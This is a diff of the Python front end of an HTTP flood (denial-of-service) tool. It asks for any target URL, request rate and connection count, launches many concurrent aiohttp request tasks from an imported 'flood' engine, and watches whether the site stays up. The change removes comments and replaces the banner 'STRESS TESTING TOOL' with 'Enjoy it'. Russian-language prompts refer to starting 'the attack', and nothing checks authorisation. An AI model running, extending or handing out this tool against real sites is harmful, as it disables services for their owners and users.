@@ -10,11 +10,9 @@ from rich.layout import Layout
 from rich.live import Live
 from rich.align import Align
 
-# Импортируем наши модули
 from attack_engine import flood
 from system_profiler import get_attack_recommendations
 
-# --- ASCII-арт и стартовое меню ---
 ASCII_ART = """
 [bold red]
 ███████╗██╗  ██╗██████╗ ██████╗ ██╗███╗   ██╗
@@ -23,7 +21,7 @@ ASCII_ART = """
 ██╔══╝   ██╔██╗ ██╔═══╝ ██╔══██╗██║██║╚██╗██║
 ███████╗██╔╝ ██╗██║     ██║  ██║██║██║ ╚████║
 ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝
-        STRESS TESTING TOOL
+       Enjoy  it
 [/bold red]
 """
 
@@ -51,14 +49,14 @@ def get_user_input(console: Console, recommendations):
     return url, rps, duration, connections
 
 
-# --- Основная логика ---
+
 async def main():
     console = Console()
 
-    # --- Этап 1: Показать ASCII-арт и получить ввод ---
+    
     console.print(ASCII_ART)
 
-    # Получаем рекомендации системы
+
     recommendations = get_attack_recommendations()
 
     url, rps, duration, connections = get_user_input(console, recommendations)
@@ -66,7 +64,6 @@ async def main():
     console.print("\n[bold green]Параметры установлены. Нажмите Enter для начала атаки...[/bold green]")
     input()
 
-    # --- Этап 2: Подготовка и запуск атаки ---
     console.clear()
     stop_event = asyncio.Event()
     stats = {
@@ -74,7 +71,7 @@ async def main():
         'client_errors': 0, 'timeouts': 0, 'connection_errors': 0, 'other_errors': 0,
     }
 
-    # Создаем сессию и задачи
+
     connector = aiohttp.TCPConnector(force_close=True, limit=0, ssl=False, family=socket.AF_INET)
     timeout = aiohttp.ClientTimeout(total=15, connect=5)
 
@@ -86,18 +83,14 @@ async def main():
             tasks.append(task)
 
         start_time = time.time()
-
-        # --- Этап 3: Отображение GUI в реальном времени (без таблиц) ---
-
-        # НОВОЕ: Создаем словарь для хранения статуса сайта
         site_status = {"status_code": None, "error": None}
 
-        # НОВОЕ: Функция для проверки статуса сайта
+       
         async def check_site_status():
             """Периодически проверяет статус сайта и обновляет словарь."""
             while not stop_event.is_set():
                 try:
-                    # Используем HEAD для быстрой проверки доступности
+                   
                     async with session.head(url, timeout=5) as response:
                         site_status["status_code"] = response.status
                         site_status["error"] = None
@@ -111,17 +104,16 @@ async def main():
                     site_status["status_code"] = None
                     site_status["error"] = "Unknown Error"
 
-                # Проверяем каждую секунду
+               
                 await asyncio.sleep(1)
 
-        # НОВОЕ: Запускаем задачу для проверки статуса
         status_task = asyncio.create_task(check_site_status())
 
         def create_live_display():
             """Создает простой дисплей для live-отображения."""
             elapsed_time = time.time() - start_time
 
-            # НОВОЕ: Формируем строку статуса сайта
+      
             status_line = ""
             if site_status["status_code"] is not None:
                 if 200 <= site_status["status_code"] < 400:
@@ -135,7 +127,7 @@ async def main():
 
             info_panel = Panel(
                 f"Цель: [bold yellow]{url}[/bold yellow]\n"
-                f"{status_line}\n"  # НОВОЕ: Вставляем строку со статусом
+                f"{status_line}\n"  
                 f"Длительность: {duration} сек | Подключений: {connections}\n"
                 f"Всего запросов: [bold green]{stats['total_requests']}[/bold green] | Успешно: [bold green]{stats['success_requests']}[/bold green] | Ошибки сервера: [bold red]{stats['server_errors']}[/bold red]\n"
                 f"[bold red]Нажмите Ctrl+C для преждевременной остановки[/bold red]",
@@ -160,20 +152,16 @@ async def main():
 
             return layout
 
-        # Создаем Live-дисплей
         with Live(console=console, refresh_per_second=4, transient=False) as live:
-            # НОВОЕ: Ожидаем завершения и атакующих задач, и задачи проверки статуса
+          
             all_tasks = tasks + [status_task]
             while not all(task.done() for task in all_tasks) and not stop_event.is_set():
                 live.update(create_live_display())
                 await asyncio.sleep(0.25)
 
-        # --- Этап 4: Завершение ---
-        # Убедимся, что все задачи завершены
+        
         if not stop_event.is_set():
-            await asyncio.gather(*all_tasks)  # НОВОЕ: Ждем все задачи, включая status_task
-
-        # --- Этап 5: Финальный вывод (без таблицы) ---
+            await asyncio.gather(*all_tasks)  
         console.clear()
         final_elapsed_time = time.time() - start_time
         if stop_event.is_set():
@@ -183,22 +171,21 @@ async def main():
 
         console.print(f"[bold yellow]Всего отправлено запросов: {stats['total_requests']}[/bold yellow]")
 
-# Ця функція має бути поза main
+
 def handle_shutdown(signum, frame):
-    """Обробка Ctrl+C"""
-    print("\n[bold yellow] Отримано сигнал зупинки...[/bold yellow]")
-    # В асинхронному коді краще використовувати інший підхід,
-    # але для простоти залишимо логіку зупинки всередині asyncio
+    """Оброботка Ctrl+C"""
+    print("\n[bold yellow] Получено сигнал остановки..[/bold yellow]")
+  
     raise KeyboardInterrupt
 
 if __name__ == "__main__":
-    # Встановлюємо обробник сигналу
+   
     signal.signal(signal.SIGINT, handle_shutdown)
 
     try:
-        # ЗАПУСК ГОЛОВНОЇ ФУНКЦІЇ
+       
         asyncio.run(main())
     except KeyboardInterrupt:
-        print("\n[bold red]Програма зупинена користувачем.[/bold red]")
+        print("\n[bold red]Программа остановленна пользователем.[/bold red]")
     except Exception as e:
-        print(f"\n[bold red]Виникла помилка: {e}[/bold red]")
+        print(f"\n[bold red]Ошибка: {e}[/bold red]")
